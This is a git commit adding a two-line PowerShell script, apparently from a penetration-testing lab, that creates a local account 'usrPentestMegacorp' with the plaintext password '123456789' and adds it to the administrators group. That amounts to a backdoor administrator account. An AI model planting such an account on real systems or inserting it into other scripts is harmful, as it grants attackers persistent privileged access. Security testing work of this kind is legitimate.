689393ca1f9d9bfc887873973b907dcb48425a12
arnoudx6 <arnoud.stolk@ziggo.nl>
2022-11-06 12:43:00 +0100

    upload admin service
    upload admin service

---
+++ adminservice/adminservice.ps1
@@ -0,0 +1,2 @@
+﻿$user = New-LocalUser 'usrPentestMegacorp' -FullName 'Pentest Megacorp' -Password (ConvertTo-SecureString -AsPlainText '123456789' -Force)
+Add-LocalGroupMember -Member $user -Group 'administrators'
